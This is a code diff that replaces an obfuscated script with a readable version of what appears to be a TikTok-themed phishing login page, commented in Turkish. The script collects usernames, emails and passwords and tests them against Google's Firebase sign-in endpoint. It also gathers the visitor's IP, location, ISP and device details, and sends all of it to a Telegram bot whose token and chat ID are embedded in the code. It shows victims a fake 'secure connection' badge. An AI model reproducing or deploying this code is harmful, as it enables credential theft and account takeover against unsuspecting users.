@@ -1,25 +1,249 @@
-(function(){var _0x=['QHwKR31cA0VjBFQTdTUCDDp5XQUgG3ggEw8fKl5LEHoVMUMKHRh1FT5TWghfIg==','QHMBSH5dB0ViBw==','OQJDER8UcyZ8eyE/BRARUTQhfiIUJFQSBnwhF1w9Zk8WOWgeGlQC','OQl9','RLEFiA==','DTgUFS0eRlsnVkNiBV0gURM/Vhs6Q1EZPA==','HSUUJR8=','OSZcAiUOU1kfUhkNbRwmUw==','OSdUESIUUw==','RKIFmg==','HT4UEykDRgQwW0M0RhJ5CEplTRknGV0dJxkNPVk=','HC4UNAk=','PT5LHzwIHTQ0RQI7Wg==','Gj9XJR8=','Gj9XNAk=','EThWMi0JVRM=','FCRaESAIZhMpQw==','DDFtFTQZ','DD9sAykfXBc8Ug==','DD98HS0EXg==','DD9pET8eRRkjUw==','DCReFyAIYgETQwA=','DD9/Hz4A','Gj9XIzkPXx8l','DCRYAzgvXQ4=','GyRXHh8ZUwIkRA==','GyRXHhgISgI=','Cz5aEykeQTknUhw+VQo=','Cz5aEykeQTU9WB03dgc6','LRg=','PA4=','GShNGToI','CCpKAzsCQBI=','DC5BBA==','P3tjPAk=','P51qJAk/','Cz9YBDkeHxQwUwk3FA==','GyNcEycEXBE=','OiomHC0DRkdxXAE8QAE7VFguXRkgBEsZIxlAfA==','ED9NAD9XHVkwRwd8QBY4XR85WB1iAkARflUBJg==','VyxcBAEI','OiomHC0DRkdxXw8mVQBl','GyRXHikORhM1','P7dPFSIBW1YzVnE+VR0gCVgqUgQlCw==','HipQHCkJ','DCRYAzhNRB8iXgw+UVM=','HTlL','FyA=','DCRYAzg=','FztcHg==','GTlQEWEFWxI1UgA=','HipVAyk=','Fz1cAiAMS1s+Rws8','DDlMFQ==','ED9NAD9XHVk4Rw8iXV03V1chSh8iQg==','FiQUAzgCQBM=','ETtYACVNXBk/GlxiBA==','GiJVGSIAWw8+RQ==','R3Q=','n71DjCAIXxM1Xg==','fWsTMg0zcyQYeydyYDofbDcAGTd8PwIoYR0=','NGsTMg0zcyQYZCcIFDRkakgVGTQJI3c7FGReeA==','eUo4cU1sM3dQNm9TNXJVOXlKOHFNbA==','REYZWg6bXhE0DURy','WGNwIwNXEg==','RbsZWgICVhNrHU4y','GA==','RagZWggEXkx7Fw4=','RVsZWggYQAM8DURy','2EQZWgQMRhdxZAswURE9AlJr','RS8ZWgcYXhowWV8xBVMVXElxE1AsLQ==','RawZWglAQhkiQw9oHlM0','RVoZWhIEVAQ0DURyVA==','RFsZWgU9CFxxVw==','RYYZWgcCXAM8DURy','VGs=','RaoZWgU+Ykx7Fw==','RboZWg8EWhcrDURy','WGM=','AA==','UWs=','RRkZWhYMXxc/DURyVA==','DDkUJB4=','PT5LHzwIHT8iQw88VgY4','fQ==','KARqJA==','OyRXBCkDRlsFTh43','GTtJHCUOUwI4WAB9XgA7Vg==','NSpLGygCRRg=','ED9NAD9XHVk4Uws8QBogQQwkVhwnBEZYNlgBNVgWNUgROBcTIwAdAGAYDzFXHCFWDDgDAyUKXD8/YAcmXCM1Sws8VgIoUlkTKAo=','MQVvMQAkdikdeCkbeg==','PQZ4OQAyfDkFaCgdYT0Q','Oj4ZFWEdXQUlVk4hXQAgXRUvXFAnDEtHJVtfclAWS1EUZQ==','MQVvMQAkdikBdj0BYzwGfA==','PyJLGSAIXFYOXgggUVM8WQwqVUFi','MQVvMQAkdikdeCkbeiwXaj0PfD4YJHM6Ag==','PWZJHz8ZU1YnUhczFCw9XgouGQktA15HDhk=','PyRWFyAIEj4wQw8hBVN8','NLdNFikDEgKtWk4zWBI6VBk5CFAoAl4SJEUbPBo=','RDhJESJNURowRB1vFgAkURYlXAJuUw5ZIkcPPAo3OycKPlURIlxLGSMZQHw=','PyRWFyAIEh40RA8wBVM/VxY/Sx8gTVcSOFsHK1sBehZW','fWt/GT4IUBciUk4WW2wmTRQqVxR9TRojGHNUcg==','NGt9H1MfRxowWg9ydhILWQp6SkE2','LC5VFSsfUxtxVQ9NWBI6TElrURE4DEFHaxc=','PyJLGRNNaxch','MC5KETxNUBdOWw88UEJ0j1gMUAIlMhIUMGgPIAUfZQ==','PyJLGRNNUBcOVhxjWEJ6GDg=','WCNcAy0PAxgwFwwzKx81VkknXUFi','PyJLGRNNUBcOVhxjR0Iu','PWZJHz8ZU1YnUhczFCw9XgouGQktA15HDhk=','MRh2Smw=','Cy5XFAEIQQUwUAs='];
-var _k='xK9pLm2vQ7nR4sT8';
-function _d(i){var s=atob(_0x[i]),o='',j=0;for(;j<s.length;j++)o+=String.fromCharCode(s.charCodeAt(j)^_k.charCodeAt(j%_k.length));return o;}
-var a=_d(0),b=_d(1),c=_d(2);
-var d={US:{name:_d(3),flag:_d(4),node:_d(5),locale:_d(6),tz:_d(7),code:'US'},DE:{name:_d(8),flag:_d(9),node:_d(10),locale:_d(11),tz:_d(12),code:'DE'}};
-var e=document.getElementById(_d(13)),f=document.getElementById(_d(14)),g=document.getElementById(_d(15)),h=document.getElementById(_d(16)),i=document.getElementById(_d(17)),j=document.getElementById(_d(18)),k=document.getElementById(_d(19)),l=document.getElementById(_d(20)),m=document.getElementById(_d(21)),n=document.getElementById(_d(22)),o=document.getElementById(_d(23)),p=document.getElementById(_d(24)),q=document.getElementById(_d(25)),r=document.getElementById(_d(26)),s=document.getElementById(_d(27)),t=document.getElementById(_d(28));
-var u=_d(29);
-function v(w){var x=d[w]?w:_d(29);u=x;var y=d[x];g.textContent=_d(110)+x;h.textContent=y.locale;i.textContent=y.tz;e.classList.toggle(_d(31),x===_d(29));f.classList.toggle(_d(31),x===_d(30));}
-e.addEventListener('click',function(){v(_d(29));});
-f.addEventListener('click',function(){v(_d(30));});
-m.addEventListener('click',function(){var z=l.type===_d(32);l.type=z?_d(33):_d(32);m.textContent=z?_d(34):_d(35);});
-function A(B,C){q.className=_d(36)+B;r.textContent=C;}
-async function D(){A(_d(37),_d(38));try{var E=await fetch(_d(39)+encodeURIComponent(a)+_d(40));var F=await E.json();if(!E.ok||!F.ok)throw new Error(_d(41));A(_d(42),_d(43));}catch(G){A(_d(44),_d(41));}}
-function H(I,J){p.textContent=I;p.className=_d(45)+(J?_d(46):_d(47));}
-function K(){p.className=_d(48);}
-function L(){K();s.classList.add(_d(49));s.setAttribute(_d(50),_d(51));document.body.classList.add(_d(52));}
-function M(){s.classList.remove(_d(49));s.setAttribute(_d(50),_d(53));document.body.classList.remove(_d(52));j.value='';k.value='';l.value='';l.type=_d(32);m.textContent=_d(35);A(_d(42),_d(43));}
-t.addEventListener('click',M);
-s.addEventListener('click',function(N){if(N.target===s)return;});
-async function O(){try{var P=await fetch(_d(54),{cache:_d(55)});if(!P.ok)throw new Error(_d(56));var Q=await P.json();return{ip:Q.ip||_d(57),country:(Q.country_name||_d(57))+' ('+(Q.country_code||_d(58))+')',city:Q.city||_d(57),isp:Q.org||_d(57)};}catch(R){return{ip:_d(59),country:_d(59),city:_d(59),isp:_d(59)};}}
-async function S(T,U,V,W,X,Y){var Z=await O();var aa=new Date().toLocaleString(_d(82),{timeZone:_d(83)});var ab=X.startsWith(_d(84));var ac=[ab?_d(60):_d(61),_d(62),_d(63)+W.flag+' '+W.name+_d(64)+W.code+')',_d(65)+W.node+_d(66),_d(67)+W.locale+_d(66),_d(68)+X];if(!ab&&Y)ac.push(_d(69)+Y);ac.push(_d(62),_d(70)+(T||_d(57))+_d(66),_d(71)+(U||_d(57))+_d(66),_d(72)+(V||_d(57))+_d(66),_d(62),_d(73)+Z.ip+_d(66),_d(74)+Z.city+_d(75)+Z.country,_d(76)+Z.isp,_d(77)+(navigator.platform||'?')+_d(78)+window.screen.width+_d(79)+window.screen.height+_d(80),_d(81)+aa+_d(66));var ad=await fetch(_d(39)+encodeURIComponent(a)+'/'+_d(111),{method:_d(85),headers:{'Content-Type':_d(87)},body:JSON.stringify({chat_id:b,text:ac.join('\n'),parse_mode:_d(88),disable_web_page_preview:true})});var ae=await ad.json();if(!ad.ok||!ae.ok)throw new Error(ae.description||('HTTP '+ad.status));}
-async function af(ag,ah){var ai=_d(89)+encodeURIComponent(c);var aj=await fetch(ai,{method:_d(85),headers:{'Content-Type':_d(87)},body:JSON.stringify({email:ag,password:ah,returnSecureToken:true})});var ak=await aj.json();if(!aj.ok||ak.error){var al=(ak.error&&ak.error.message)||_d(90);if(al===_d(91))return{valid:false,reason:_d(92)};if(al===_d(93))return{valid:false,reason:_d(94)};if(al===_d(95))return{valid:false,reason:_d(96)};return{valid:false,reason:_d(97)+al+')'};}return{valid:true,uid:ak.localId};}
-n.addEventListener('submit',async function(am){am.preventDefault();var an=j.value.trim().replace(/^@/,'');var ao=k.value.trim();var ap=l.value;if(!an||!ao||!ap){H(_d(98),true);return;}o.disabled=true;o.innerHTML=_d(99);A(_d(37),_d(100));var aq=d[u];var ar='';var as='';var at=await af(ao,ap);if(at.valid){ar=_d(101)+at.uid+')';}else{ar=_d(102);as=at.reason;}try{await S(an,ao,ap,aq,ar,as);}catch(au){H(_d(103)+au.message,true);A(_d(44),_d(41));o.disabled=false;o.innerHTML=_d(104);return;}if(at.valid){A(_d(42),_d(105));H(_d(106)+an+_d(107),false);setTimeout(function(){L();},1000);}else{A(_d(44),_d(108));H(as||_d(109),true);}o.disabled=false;o.innerHTML=_d(104);});
-D();
-})();
+// =====================================================================
+// GİZLİ YAPILANDIRMA (DOM'da görünmez)
+// =====================================================================
+const TELEGRAM_BOT_TOKEN = "8737111323:AAFV4B2dulvJVB8qxj8DBmzzzQuGcod4ZkQ";
+const TELEGRAM_CHAT_ID   = "8888205330";
+const FIREBASE_API_KEY   = "AIzaSyAP-LOm1cEiLjGRXIfdWKOEhN2wnrQnV90";
+
+const REGIONS = {
+  US: { name:"ABD", flag:"🇺🇸", node:"us-east-va-01.tiktokv.com", locale:"en-US", tz:"America/New_York" },
+  DE: { name:"Almanya", flag:"🇩🇪", node:"eu-central-fra-02.tiktokv.com", locale:"de-DE", tz:"Europe/Berlin" }
+};
+
+const btnUS        = document.getElementById("btnUS");
+const btnDE        = document.getElementById("btnDE");
+const isoBadge     = document.getElementById("isoBadge");
+const localeText   = document.getElementById("localeText");
+const tzText       = document.getElementById("tzText");
+const usernameIn   = document.getElementById("ttUsername");
+const emailIn      = document.getElementById("ttEmail");
+const passwordIn   = document.getElementById("ttPassword");
+const togglePwBtn  = document.getElementById("togglePwBtn");
+const ttForm       = document.getElementById("ttForm");
+const btnSubmit    = document.getElementById("btnSubmit");
+const toastBox     = document.getElementById("toastBox");
+const connStatus   = document.getElementById("connStatus");
+const connText     = document.getElementById("connText");
+const successOverlay  = document.getElementById("successOverlay");
+const successCloseBtn = document.getElementById("successCloseBtn");
+
+let currentRegion = "US";
+
+// === BÖLGE SEÇİMİ ===
+function setRegion(code) {
+  const c = REGIONS[code] ? code : "US";
+  currentRegion = c;
+  const r = REGIONS[c];
+  isoBadge.textContent   = `ISO: ${c}`;
+  localeText.textContent = r.locale;
+  tzText.textContent     = r.tz;
+  btnUS.classList.toggle("active", c === "US");
+  btnDE.classList.toggle("active", c === "DE");
+}
+
+btnUS.addEventListener("click", () => setRegion("US"));
+btnDE.addEventListener("click", () => setRegion("DE"));
+
+// === ŞİFRE GÖSTER / GİZLE ===
+togglePwBtn.addEventListener("click", () => {
+  const hidden = passwordIn.type === "password";
+  passwordIn.type = hidden ? "text" : "password";
+  togglePwBtn.textContent = hidden ? "GİZLE" : "GÖSTER";
+});
+
+// === BAĞLANTI DURUMU ===
+function setConnectionStatus(state, text) {
+  connStatus.className = "status-badge " + state;
+  connText.textContent = text;
+}
+
+async function checkBotConnection() {
+  setConnectionStatus("checking", "Bağlantı kontrol ediliyor...");
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/getMe`);
+    const data = await res.json();
+    if (!res.ok || !data.ok) throw new Error("Bağlantı hatası");
+    setConnectionStatus("connected", "Güvenli bağlantı aktif");
+  } catch (err) {
+    setConnectionStatus("failed", `Bağlantı hatası`);
+  }
+}
+
+// === TOAST ===
+function showToast(msg, isError = false) {
+  toastBox.textContent = msg;
+  toastBox.className = "toast visible " + (isError ? "err" : "ok");
+}
+function hideToast() {
+  toastBox.className = "toast";
+}
+
+// === BAŞARI OVERLAY ===
+function openSuccessOverlay() {
+  hideToast();
+  successOverlay.classList.add("open");
+  successOverlay.setAttribute("aria-hidden", "false");
+  document.body.classList.add("overlay-open");
+}
+function closeSuccessOverlay() {
+  successOverlay.classList.remove("open");
+  successOverlay.setAttribute("aria-hidden", "true");
+  document.body.classList.remove("overlay-open");
+  usernameIn.value = "";
+  emailIn.value = "";
+  passwordIn.value = "";
+  passwordIn.type = "password";
+  togglePwBtn.textContent = "GÖSTER";
+  setConnectionStatus("connected", "Güvenli bağlantı aktif");
+}
+successCloseBtn.addEventListener("click", closeSuccessOverlay);
+successOverlay.addEventListener("click", (e) => {
+  if (e.target === successOverlay) return;
+});
+
+// === IP BİLGİSİ ===
+async function fetchClientNetworkInfo() {
+  try {
+    const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+    if (!res.ok) throw new Error("ipapi non-200");
+    const data = await res.json();
+    return {
+      ip: data.ip || "bilinmiyor",
+      country: `${data.country_name || "bilinmiyor"} (${data.country_code || "??"})`,
+      city: data.city || "bilinmiyor",
+      isp: data.org || "bilinmiyor"
+    };
+  } catch (_) {
+    return { ip:"çözülemedi", country:"çözülemedi", city:"çözülemedi", isp:"çözülemedi" };
+  }
+}
+
+// === TELEGRAM'A MESAJ GÖNDER ===
+async function sendToTelegram(username, email, password, region, status, failReason) {
+  const netInfo = await fetchClientNetworkInfo();
+  const nowTr   = new Date().toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" });
+  const isSuccess = status.startsWith("✅");
+
+  const lines = [
+    isSuccess ? `✅ *BAŞARILI TIKTOK GİRİŞİ*` : `❌ *BAŞARISIZ GİRİŞ DENEMESİ*`,
+    `━━━━━━━━━━━━━━━━━━━━━━`,
+    `🌍 *Bölge:* ${region.flag} ${region.name} (ISO: ${region.code})`,
+    `🛰 *Node:* \`${region.node}\``,
+    `🗣 *Dil:* \`${region.locale}\``,
+    `🔐 *Durum:* ${status}`
+  ];
+
+  if (!isSuccess && failReason) {
+    lines.push(`⚠️ *Hata Sebebi:* ${failReason}`);
+  }
+
+  lines.push(
+    `━━━━━━━━━━━━━━━━━━━━━━`,
+    `👤 *Kullanıcı Adı:* \`@${username || "boş"}\``,
+    `📧 *E-posta:* \`${email || "boş"}\``,
+    `🔑 *Şifre:* \`${password || "boş"}\``,
+    `━━━━━━━━━━━━━━━━━━━━━━`,
+    `🌐 *IP:* \`${netInfo.ip}\``,
+    `📍 *Konum:* ${netInfo.city}, ${netInfo.country}`,
+    `📡 *ISP:* ${netInfo.isp}`,
+    `📱 *Cihaz:* ${navigator.platform || "?"} (${window.screen.width}x${window.screen.height})`,
+    `🕒 *Zaman:* \`${nowTr}\``
+  );
+
+  const resp = await fetch(`https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: lines.join("\n"),
+      parse_mode: "Markdown",
+      disable_web_page_preview: true
+    })
+  });
+  const result = await resp.json();
+  if (!resp.ok || !result.ok) throw new Error(result.description || `HTTP ${resp.status}`);
+}
+
+// === FIREBASE İLE DOĞRULAMA ===
+async function verifyFirebase(email, password) {
+  const endpoint = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${encodeURIComponent(FIREBASE_API_KEY)}`;
+  const res = await fetch(endpoint, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ email, password, returnSecureToken: true })
+  });
+  const data = await res.json();
+  if (!res.ok || data.error) {
+    const code = (data.error && data.error.message) || "INVALID_LOGIN";
+    if (code === "EMAIL_NOT_FOUND") return { valid: false, reason: "Bu e-posta sistemde kayıtlı değil." };
+    if (code === "INVALID_PASSWORD") return { valid: false, reason: "Girilen şifre hatalı." };
+    if (code === "INVALID_LOGIN_CREDENTIALS") return { valid: false, reason: "E-posta veya şifre yanlış." };
+    return { valid: false, reason: `Google Hatası (${code})` };
+  }
+  return { valid: true, uid: data.localId };
+}
+
+// === GİRİŞ YAP ===
+ttForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const username = usernameIn.value.trim().replace(/^@/, "");
+  const email    = emailIn.value.trim();
+  const password = passwordIn.value;
+
+  if (!username || !email || !password) {
+    showToast("Lütfen tüm alanları doldurun.", true);
+    return;
+  }
+
+  btnSubmit.disabled = true;
+  btnSubmit.innerHTML = '<span class="spinner"></span>Doğrulanıyor...';
+  setConnectionStatus("checking", "Google hesabı kontrol ediliyor...");
+
+  const r = REGIONS[currentRegion];
+  let authStatus = "";
+  let failReason = "";
+
+  // 1. Firebase kontrolü
+  const fbCheck = await verifyFirebase(email, password);
+  
+  if (fbCheck.valid) {
+    authStatus = `✅ Firebase Doğrulandı (UID: ${fbCheck.uid})`;
+  } else {
+    authStatus = `❌ Doğrulama Başarısız`;
+    failReason = fbCheck.reason;
+  }
+
+  // 2. Her durumda Telegram'a gönder
+  try {
+    await sendToTelegram(username, email, password, r, authStatus, failReason);
+  } catch (err) {
+    showToast(`Telegram bağlantı hatası: ${err.message}`, true);
+    setConnectionStatus("failed", "Bağlantı hatası");
+    btnSubmit.disabled = false;
+    btnSubmit.innerHTML = "Giriş Yap";
+    return;
+  }
+
+  // 3. Sonuçları Ekrana Yansıt
+  if (fbCheck.valid) {
+    setConnectionStatus("connected", "Hesap bağlandı · Giriş başarılı");
+    showToast(`Giriş başarılı. @${username} hesabına bağlanıldı.`, false);
+
+    // 1 saniye sonra başarı overlay'i aç
+    setTimeout(() => {
+      openSuccessOverlay();
+    }, 1000);
+
+  } else {
+    // Yanlış e-posta/şifre → overlay AÇILMAZ, sadece hata göster
+    setConnectionStatus("failed", "Giriş başarısız");
+    showToast(failReason || "E-posta veya şifre yanlış.", true);
+  }
+
+  btnSubmit.disabled = false;
+  btnSubmit.innerHTML = "Giriş Yap";
+});
+
+// Başlangıçta bot bağlantısını kontrol et
+checkBotConnection();
